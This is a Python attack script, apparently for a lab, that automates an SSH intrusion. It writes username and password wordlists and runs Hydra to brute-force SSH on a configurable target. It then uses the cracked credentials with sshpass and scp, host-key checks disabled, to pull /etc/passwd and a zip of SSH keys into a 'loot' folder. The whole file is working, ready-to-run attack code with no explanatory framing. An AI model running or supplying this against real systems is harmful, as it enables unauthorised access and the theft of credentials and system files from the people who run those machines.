#!/usr/bin/env python3

import os
import sys
import random
import string

# === CONFIGURATION ===
target_ip = "127.0.0.1"
output_file = "cracked.txt"
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"
file_to_exfil1 = "/etc/passwd"
file_to_exfil2 = "/tmp/steal/ssh_keys.zip"
exfil_destination = "./loot"

# === REALISTIC USERNAMES AND PASSWORDS ===
common_usernames = [
    "admin", "ubuntu", "root", "john", "maria", "david", "alice", "mark", "emma", "james",
    "sara", "robert", "linda", "mike", "nancy", "daniel", "olivia", "kevin", "rachel", "peter"
]

common_passwords = [
    "password123", "admin2024", "qwerty", "letmein", "ubuntu", "123456", "rootroot",
    "mypass123", "iloveyou", "pass@123", "welcome1", "changeme", "superuser", "hello123",
    "securepwd", "abc12345", "default", "user2024", "temp1234", "1qaz2wsx"
]

# === Fill to 100 entries with variations ===
def extend_list(base_list, target_len):
    extended = base_list[:]
    while len(extended) < target_len:
        extended.append(
            random.choice(base_list) + str(random.randint(1, 999))
        )
    return extended[:target_len]

usernames = extend_list(common_usernames, 100)
passwords = extend_list(common_passwords, 100)

# --Write wordlists 
print("[*] Creating usernames and passwords...")
with open(usernames_file, "w") as ufile:
    ufile.write('\n'.join(usernames) + '\n')

with open(passwords_file, "w") as pfile:
    pfile.write('\n'.join(passwords) + '\n')

# -- Hydra brute-force
print("[*] Running Hydra brute force attack ")
hydra_cmd = f"hydra -L {usernames_file} -P {passwords_file} ssh://{target_ip} -f -o {output_file}"
if os.system(hydra_cmd) != 0:
    print("[!] Hydra failed or found nothing.")
    sys.exit(1)

# === STEP 3: Parse cracked credentials ===
print("[*] Extracting cracked credentials...")
try:
    with open(output_file, "r") as f:
        for line in f:
            if "login:" in line and "password:" in line:
                username = line.split("login:")[1].split()[0]
                password = line.split("password:")[1].strip()
                print(f"[+] Cracked credentials: {username}:{password}")
                break
        else:
            print("[!] No credentials cracked.")
            sys.exit(1)
except Exception as e:
    print(f"[!] Failed to parse cracked output: {e}")
    sys.exit(1)

# === STEP 4: SCP Exfiltration of /etc/passwd ===
print("[*] Exfiltrating /etc/passwd via SCP...")
os.makedirs(exfil_destination, exist_ok=True)
scp_passwd = f'sshpass -p "{password}" scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {username}@{target_ip}:{file_to_exfil1} {exfil_destination}/'
if os.system(scp_passwd) == 0:
    print(f"[+] Exfiltrated /etc/passwd to {exfil_destination}/")
else:
    print("[!] Failed to exfiltrate /etc/passwd.")

# === STEP 5: SCP Exfiltration of SSH Key ZIP ===
print("[*] Exfiltrating SSH keys ZIP via SCP...")
scp_zip = f'sshpass -p "{password}" scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {username}@{target_ip}:{file_to_exfil2} {exfil_destination}/'
if os.system(scp_zip) == 0:
    print(f"[+] Exfiltrated SSH keys zip to {exfil_destination}/")
else:
    print("[!] Failed to exfiltrate ssh_keys.zip.")

